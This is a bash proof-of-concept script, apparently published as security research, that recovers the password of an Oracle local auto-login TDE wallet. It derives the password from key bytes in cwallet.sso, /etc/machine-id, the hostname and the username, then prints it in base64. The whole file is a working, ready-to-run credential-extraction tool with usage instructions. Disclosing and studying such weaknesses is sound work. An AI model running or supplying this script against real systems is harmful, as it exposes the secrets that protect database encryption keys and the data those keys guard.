#!/bin/bash
#set -x
#
# Purpose:
#   Proof of concept script to deobfuscate Oracle 26ai
#   local auto-login wallet passwords. Run this as the
#   user that created the local auto-login wallet.
#
# Credits:
#   Tjado Mäcke, ssoDecrypt, https://github.com/tejado/ssoDecrypt
#
# Date:
#   Sep-01 2026
#
# Author:
#   Christoph Lutz
#
# Tested on:
#   Oracle 23.26.0 / OEL 8.10
#
# Usage:
#   ./ssoLocalDecrypt26aiPassword.sh <wallet_root>
#

# -------------------------------------------
# Globals
# -------------------------------------------
readonly KEY_OFF=16
readonly KEY_LEN=32
readonly HOST_NAME="$(hostname)"
readonly USER_NAME="$(whoami)"
readonly MACHINE_ID="$(grep -v '^$' /etc/machine-id)"

# -------------------------------------------
# Script inputs
# -------------------------------------------
WALLET_ROOT="$1"

# -------------------------------------------
# Checks
# -------------------------------------------
echo 

if [[ $# -ne 1 ]] ; then
    printf "Usage: $0 <wallet_root>\n\n"
    exit 1
fi

if [[ ! -d "$WALLET_ROOT" ]] ; then
    printf "WALLET_ROOT directory not found: $WALLET_ROOT\n\n"
    exit 1
fi

if [[ ! -d "$WALLET_ROOT/tde" ]] ; then
    printf "WALLET_ROOT/tde directory not found: $WALLET_ROOT/tde\n\n"
    exit 1
fi

if [[ ! -w "$WALLET_ROOT/tde" ]] ; then
    printf "WALLET_ROOT/tde directory not writable: $WALLET_ROOT/tde\n\n"
    exit 1
fi

if [[ ! -e "$WALLET_ROOT/tde/cwallet.sso" ]] ; then
    printf "Auto-login wallet not found: $WALLET_ROOT/tde/cwallet.sso\n\n"
    exit 1
fi

if [[ ! -x "/usr/bin/openssl" ]] ; then
    printf "openssl not found or not executable: /usr/bin/openssl\n\n"
    exit 1
fi

if [[ -z "$ORACLE_HOME" ]] ; then
    printf "ORACLE_HOME variable not set\n\n"
    exit 1
fi

if [[ ! -f "/etc/machine-id" ]] ; then
    printf "/etc/machine-id not found\n\n"
    exit 1
fi

# -------------------------------------------
# Recover password
# -------------------------------------------
key=$(od -An -tx1 -j $KEY_OFF -N $KEY_LEN $WALLET_ROOT/tde/cwallet.sso | tr -d ' \n')

msg=$(echo -n ${HOST_NAME}${USER_NAME}${MACHINE_ID})

msg_hash=$(echo -n "$msg" | openssl dgst -sha256 -r | awk '{print $1}')

hmac256=$(echo -n "$msg_hash" | perl -pe 's/([0-9a-fA-F]{2})/chr(hex($1))/ge' |
          openssl dgst -sha256 -r -mac HMAC -macopt "hexkey:$key" | awk '{print $1}')

password_b64=$(echo -n "$hmac256" | perl -pe '$_=pack("H*", $_)' | base64 -w 0)

# -------------------------------------------
# Show details
# -------------------------------------------
echo "WALLET_ROOT   : $WALLET_ROOT"
echo "HOST_NAME     : $HOST_NAME"
echo "USER_NAME     : $USER_NAME"
echo "MACHINE_ID    : $MACHINE_ID"
echo "key           : $key"
echo "msg           : $msg"
echo "msg_hash      : $msg_hash"
echo "hmac256       : $hmac256"
echo "password (b64): $password_b64"
echo

exit 0
